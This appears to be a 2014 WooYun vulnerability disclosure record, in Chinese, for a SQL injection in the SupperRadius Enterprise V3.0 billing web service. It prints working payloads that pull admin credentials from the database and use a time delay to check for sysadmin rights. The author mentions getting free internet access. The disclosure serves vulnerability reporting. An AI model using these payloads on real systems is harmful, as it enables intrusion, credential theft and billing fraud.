{"id": 5633, "wybug_id": "wooyun-2014-049209", "wybug_title": "SupperRadius企业版V3.0 SQL注射漏洞", "wybug_corp": "亿联网络科技", "wybug_author": "applychen", "wybug_date": "2014-01-18 12:16", "wybug_open_date": "2014-03-04 12:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-04：\t细节向公众公开  简要描述： SupperRadius企业版V3.0 SQL注射漏洞 详细说明：  家里上网用的宽带恰好是用supperradius来计费的。在企业版中的web services存在一处SQL注射漏洞，能够查询、删除、修改数据库内的账号从而达到免费上网的目的：）访问以下计费服务器地址：\nhttp://192.168.1.1/GateWay/RosApi.asmx\n\n\n其中的CheckLoginUser与SetUserOffLine能够注入SQL语句：\nhttp://192.168.1.1/GateWay/RosApi.asmx?op=CheckLoginUserhttp://192.168.1.1/GateWay/RosApi.asmx?op=SetUserOffLine\n\n\n\n\n将上面的两个POST数据包复制到burp suite中进行提交，首先是CheckLoginUser：\n\n上图中的userid与gid节点都能够实施注入，返回如下图：\n\n下面查询sr_ent_sysmember中的数据：\n1'and 1=(select top 1 name from sr_ent_sysmember)--\n\n\n\n1'and 1=(select pwd from sr_ent_sysmember where name='myradius')--\n\n\nSetUserOffLine中的注入是基于时间延迟，查询是否为sysadmin角色，是的话就延迟10秒：\n1';if(select is_srvrolemember('sysadmin'))=1 waitfor delay '0:0:10'--\n\n\n提交查询之后页面很明显的进入延迟状态，说明当前角色为sa。使用账号密码进入到后台：\n\n\n\n   漏洞证明：  同上。   修复方案：  过滤变量。   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-01-23 08:22 厂商回复： 涉及内部网络系统，暂未能直接确认或本地复现，为做好处置，已经由CNVD通过公开联系渠道向软件生产厂商进行了通报，由其进行确认和反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-04 14:59 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  公网有不，来个源码。哈哈    \n     2014-03-04 16:20 |    \t\tapplychen \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:16        | 白发现首)\t\t \n  @wefgod 公网应该木有，一般小区宽带啥的    \n     2014-03-04 21:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @applychen 原来如此。木有环境测试的木有意思哦    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}